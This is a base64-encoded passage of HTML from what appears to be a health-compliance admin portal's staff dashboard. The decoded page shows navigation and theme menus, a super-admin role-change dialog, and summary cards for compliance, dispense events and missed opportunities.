uLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9tYWluLmNzcz92PWY3MmQ0MiI+CgogICAgICAgIDxzY3JpcHQ+dmFyIHRoZW1lQ29va2llTmFtZSA9ICczOTk6OnRoZW1lJzwvc2NyaXB0PjxzY3JpcHQ+dmFyIGFjdGl2ZVRoZW1lID0gJ2xpZ2h0Jzwvc2NyaXB0PiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9tYWluLWxpZ2h0LmNzcz92PWY3MmQ0MiI+CgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9mb250cy9zdHlsZXNoZWV0LmNzcyI+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICAgICAgZG9jdW1lbnQuY29va2llID0gInNjcmVlbldpZHRoPSIrc2NyZWVuLndpZHRoKyI7MzA7cGF0aD0vIjsKICAgICAgICA8L3NjcmlwdD4KICAgIDwvaGVhZD4KICAgIDxib2R5IGNsYXNzPSJsYXlvdXQtdG9wLW5hdiBiZy1jb2xvci13aGl0ZSI+CiAgICAgICAgPGRpdiBjbGFzcz0id3JhcHBlciIgc3R5bGU9InBhZGRpbmc6IDFyZW07Ij4KICAgICAgICAgICAgPG5hdiBjbGFzcz0ibWFpbi1oZWFkZXIgbmF2YmFyIj4KICAgICAgICAgICAgICAgIDwhLS0gTGVmdCBuYXZiYXIgbGlua3MgLS0+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtOSBjb2wtc20tOSBjb2wtbWQtOSBjb2wtbGctOSBjb2wteGwtMyBwLTAgZC1mbGV4Ij4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9sb2dvX2JsdWUucG5nIiBhbHQ9Ik1pcmFkb3IgTG9nbyIgY2xhc3M9ImJyYW5kLWltYWdlIiBzdHlsZT0ibWFyZ2luOiAwOyBoZWlnaHQ6IDQwcHg7Ij4KICAgICAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImQtZmxleCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0taW5saW5lIG1sLTMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgaW5wdXQtZ3JvdXAtc20iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJzZWFyY2giIHBsYWNlaG9sZGVyPSJTZWFyY2giIGFyaWEtbGFiZWw9IlNlYXJjaCIgb25rZXl1cD0iYWR2U2VhcmNoKHRoaXMudmFsdWUpIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cC1hcHBlbmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJidG4gYnRuLW5hdmJhciBzZWFyY2gtYnRuIiB0eXBlPSJzdWJtaXQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zZWFyY2giPjwvaT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9zcGFuPgogICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgPCEtLSBSaWdodCBuYXZiYXIgbGlua3MgLS0+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgY29sLXhsLTkgcC0wIHJpZ2h0LWhlYWRlciBkLW5vbmUgZC14bC1mbGV4IG0tMCI+CiAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImNvbG9yLWRhcmstZ3JleSIgc3R5bGU9Im1hcmdpbjogYXV0byAxcmVtIGF1dG8gMDsiPgogICAgICAgICAgICAgICAgICAgICAgICA8Yj5UaW1lIGlzIGRpc3BsYXllZCBpbiBVVEM8L2I+CiAgICAgICAgICAgICAgICAgICAgPC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdi1pdGVtIGRyb3Bkb3duIG15LWF1dG8iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL21pcmFkb3JoZWFsdGgub2Rvby5jb20vIiBjbGFzcz0iZHJvcGRvd24taXRlbSBuYXYtaWNvbnMiIHN0eWxlPSJwYWRkaW5nOiAwIC4yNXJlbTsiIHRhcmdldD0iX2JsYW5rIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1xdWVzdGlvbiBuYXYtaWNvbiIgYXJpYS1oaWRkZW49InRydWUiIHN0eWxlPSJmb250LXNpemU6IDEuN3JlbTsiPjwvaT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgIDwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdi1pdGVtIGRyb3Bkb3duIG15LWF1dG8iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iZHJvcGRvd24taXRlbSBuYXYtaWNvbnMiIGRhdGEtdG9nZ2xlPSJkcm9wZG93biIgaHJlZj0iIyIgc3R5bGU9InBhZGRpbmc6IDAgLjI1cmVtOyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9maWxlcy9wcm9maWxlX2ltYWdlcy8zOTkucG5nPzExMjAiIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCI+ICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkcm9wZG93bi1tZW51IGRyb3Bkb3duLW1lbnUtbGcgZHJvcGRvd24tbWVudS1yaWdodCIgc3R5bGU9Im1hcmdpbi10b3A6IDAuNXJlbTsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9Vc2VyUHJvZmlsZS8zOTkiIGNsYXNzPSJkcm9wZG93bi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtZXh0ZXJuYWwtbGluayBtci0yIGJ0biI+PC9pPiBQcm9maWxlIFNldHRpbmdzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkcm9wZG93bi1kaXZpZGVyIj48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6Y2hhbmdlVGhlbWUoJ2xpZ2h0JykiIGNsYXNzPSJkcm9wZG93bi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmEgZmEtY2lyY2xlIG1yLTIgYnRuIiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjojQ0JFRUYxO2NvbG9yOiNDQkVFRjE7Ij48L2k+IExpZ2h0IChEZWZhdWx0KSBUaGVtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tZGl2aWRlciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmNoYW5nZVRoZW1lKCdicmlnaHQnKSIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jaXJjbGUgbXItMiBidG4iIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiMyNUI5QzA7O2NvbG9yOiMyNUI5QzA7Ij48L2k+IEJyaWdodCBUaGVtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tZGl2aWRlciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmNoYW5nZVRoZW1lKCdkYXJrJykiIGNsYXNzPSJkcm9wZG93bi1pdGVtIGJ0biI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLWNpcmNsZSBtci0yIGJ0biIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6IzQ0MUIzRDs7Y29sb3I6IzQ0MUIzRDsiPjwvaT4gRGFyayBUaGVtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tZGl2aWRlciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ291dCIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1zaWduLW91dCBtci0yIGJ0biI+PC9pPiBMb2dvdXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9zcGFuPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggZC14bC1ub25lIj4KICAgICAgICAgICAgICAgICAgICA8dWwgY2xhc3M9Im5hdiBuYXYtcGlsbHMgbWwtYXV0byI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gZHJvcGRvd24gbXktYXV0byI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBkYXRhLXRvZ2dsZT0iZHJvcGRvd24iIGhyZWY9IiMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jb2ciIGFyaWEtaGlkZGVuPSJ0cnVlIiBzdHlsZT0iY29sb3I6IGRhcmtncmF5OyBmb250LXNpemU6IDEuNXJlbTsiPjwvaT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duLW1lbnUgZHJvcGRvd24tbWVudS1yaWdodCIgc3R5bGU9IiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0gY3Vyc29yUG9pbnRlciI+VGltZSBpcyBkaXNwbGF5ZWQgaW4gVVRDPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iZHJvcGRvd24taXRlbSIgaHJlZj0iaHR0cHM6Ly9taXJhZG9yaGVhbHRoLm9kb28uY29tLyIgdGFyZ2V0PSJfYmxhbmsiPkhlbHA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vRW1haWwiPk5vdGlmaWNhdGlvbnM8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vVXNlclByb2ZpbGUvMzk5Ij5Qcm9maWxlPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6Y2hhbmdlVGhlbWUoJ2xpZ2h0JykiIGNsYXNzPSJkcm9wZG93bi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLWNpcmNsZSBtci0yIiBzdHlsZT0iY29sb3I6I0NCRUVGMTsiPjwvaT4gTGlnaHQgKERlZmF1bHQpIFRoZW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6Y2hhbmdlVGhlbWUoJ2JyaWdodCcpIiBjbGFzcz0iZHJvcGRvd24taXRlbSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jaXJjbGUgbXItMiIgc3R5bGU9ImNvbG9yOiMyNUI5QzA7Ij48L2k+IEJyaWdodCBUaGVtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmNoYW5nZVRoZW1lKCdkYXJrJykiIGNsYXNzPSJkcm9wZG93bi1pdGVtIGJ0biI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jaXJjbGUgbXItMiIgc3R5bGU9ImNvbG9yOiM0NDFCM0Q7Ij48L2k+IERhcmsgVGhlbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9nb3V0Ij5Mb2dvdXQ8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8L3VsPgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibW9iaWxlLW1lbnUiIGNsYXNzPSJuYXYgbmF2LXBpbGxzIG1sLWF1dG8gbXQtYXV0byBtYi1hdXRvIHBsLTMgZC1tZC1ub25lIGQtbGctbm9uZSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2LWl0ZW0gZHJvcGRvd24gcGwtMCIgc3R5bGU9Imxpc3Qtc3R5bGUtdHlwZTogbm9uZTsgZGlzcGxheTogY29udGVudHM7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0iY3Vyc29yUG9pbnRlciIgZGF0YS10b2dnbGU9ImRyb3Bkb3duIiBocmVmPSIjIiBzdHlsZT0iY29sb3I6IHJnYmEoMCwwLDAsLjUpOyIgb25jbGljaz0ibW9iaWxlTWVudSgpIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWJhcnMiPjwvaT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgc3R5bGU9InotaW5kZXg6IDEwMDsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0icC0wIGRyb3Bkb3duLW1lbnUgZHJvcGRvd24tbWVudS1yaWdodCIgc3R5bGU9Imxpc3Qtc3R5bGUtdHlwZTogbm9uZTsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iZHJvcGRvd24taXRlbSIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS8iIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsiPkRhc2hib2FyZDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvbmF2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9Im1vZGFsLXVzZXItcm9sZSIgYXJpYS1oaWRkZW49InRydWUiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2ciPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGg0IGNsYXNzPSJtb2RhbC10aXRsZSI+U3VwZXItQWRtaW4gTWlycm9yaW5nPC9oND4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iY2xvc2UiIGRhdGEtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBhcmlhLWhpZGRlbj0idHJ1ZSI+w5c8L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgbmFtZT0ib3JnYW5pemF0aW9uVXNlcl9tb2JpbGUiIGlkPSJvcmdhbml6YXRpb25Vc2VyX21vYmlsZSIgY2xhc3M9ImZvcm0tY29udHJvbCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iIj4tLS0tIENoYW5nZSBVc2VyIFJvbGUgLS0tLTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciBqdXN0aWZ5LWNvbnRlbnQtYmV0d2VlbiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCIgZGF0YS1kaXNtaXNzPSJtb2RhbCI+Q2xvc2U8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBvbmNsaWNrPSJjaGFuZ2VVc2VyUm9sZSgnb3JnYW5pemF0aW9uVXNlcl9tb2JpbGUnKSI+U2F2ZSBjaGFuZ2VzPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBjYXJkLWJvZHkiIGlkPSJyZWxhdGVkLXNlYXJjaC1yZXN1bHQiIHN0eWxlPSIiPjwvZGl2PgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWVudSBkLW5vbmUgZC1zbS1ub25lIGQtbWQtZmxleCBuYXZiYXIgbmF2YmFyLWV4cGFuZCBwLTAiIHN0eWxlPSJmb250LXNpemU6IDFyZW07Ij4KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiI+CiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSBkLWZsZXgiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tLyIgc3R5bGU9InBhZGRpbmc6IDFyZW07IHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyI+RGFzaGJvYXJkPC9hPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvZGl2PgoKICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL2NoYXJ0anMvY2hhcnQuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvY2hhcnQtNC5qcz92PWY3MmQ0MiI+PC9zY3JpcHQ+CgogICAgPGRpdiBjbGFzcz0iY29udGVudC13cmFwcGVyIGJnLWNvbG9yICIgc3R5bGU9Im1pbi1oZWlnaHQ6IDQ2MXB4OyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzZWN0aW9uIGNsYXNzPSJjb250ZW50IHB4LTMgcHQtNCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCBwLTAiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtNiBjb2wtc20tNiBjb2wtbWQtNCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InNtYWxsLWJveCBiZy1jb2xvciB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RhZmYtZGFzaGJvYXJkLWNhcmRzIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9Im0tMCI+Q29tcGxpYW5jZSBBdmVyYWdlIExhc3QgMzAgRGF5czwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDMgaWQ9Im1vbnRoVG9EYXRlQ29tcGxpYW5jZSIgY2xhc3M9Im0tMCI+MCU8L2gzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtNiBjb2wtc20tNiBjb2wtbWQtNCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InNtYWxsLWJveCBiZy1jb2xvciB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RhZmYtZGFzaGJvYXJkLWNhcmRzIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9Im0tMCI+RGlzcGVuc2UgRXZlbnRzIExhc3QgMzAgRGF5czwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDMgaWQ9InRvdGFsU2FuaXRpemF0aW9uIiBjbGFzcz0ibS0wIj4wPC9oMz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTYgY29sLXNtLTYgY29sLW1kLTQiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJzbWFsbC1ib3ggYmctY29sb3IgdGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5uZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0YWZmLWRhc2hib2FyZC1jYXJkcyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJtLTAiPk1pc3NlZCBPcHBvcnR1bml0aWVzIExhc3QgMzAgRGF5czwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDMgaWQ9InRvdGFsTWlzc2VkT3Bwb3J0dW5pdGllcyIgY2xhc3M9Im0tMCI+MDwvaDM+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9zZWN0aW9uPgoKICAgICAgICA8c2VjdGlvbiBpZD0ic2FmZkRhc2hib2FyZEZpbHRlcnMiIGNsYXNzPSJjb250ZW50IG1iLTQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IG0tMCByZXBvcnQtaGVhZGVyIHJvdW5kZWQtZWRnZXMiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InctMTAwIiBzdHlsZT0icGFkZGluZzogOXB4IDcuNXB4OyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZsb2F0LWxlZnQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biIgaWQ9InByaW50YnV0dG9uIj5QcmludDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRhc2hib2FyZEZpbHRlclNlY3Rpb24gZC1mbGV4IHJvdyBtbC1tZC1hdXRvIG1yLW1kLTAgY29sLTEyIGNvbC1tZC1hdXRvIGp1c3RpZnktY29udGVudC1tZC1lbmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZC1mbGV4IHJvdyBhbGlnbi1pdGVtcy1iYXNlbGluZSBtLTAgY29sLTEyIGNvbC1zbS02IGNvbC1tZC1hdXRvIHB4LTAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMSBjb2wtbWQtYXV0byBweC0wIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBpZD0ic3RhZmZEYXNoYm9hcmREdXJhdGlvbiIgbmFtZT0ic3RhZmZEYXNoYm9hcmREdXJhdGlvbiIgb25jaGFuZ2U9InN0YWZmVXNlckRhc2hib2FyZFJlZnJlc2hDaGFydHMoJzM5OScsICcxJykiIHBsYWNlaG9sZGVybmFtZT0iRHVyYXRpb24iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iTW9udGhseSIgc2VsZWN0ZWQ9IiI+TW9udGhseTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iQmlXZWVrbHkiID5Ud28gV2Vla3M8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9IldlZWtse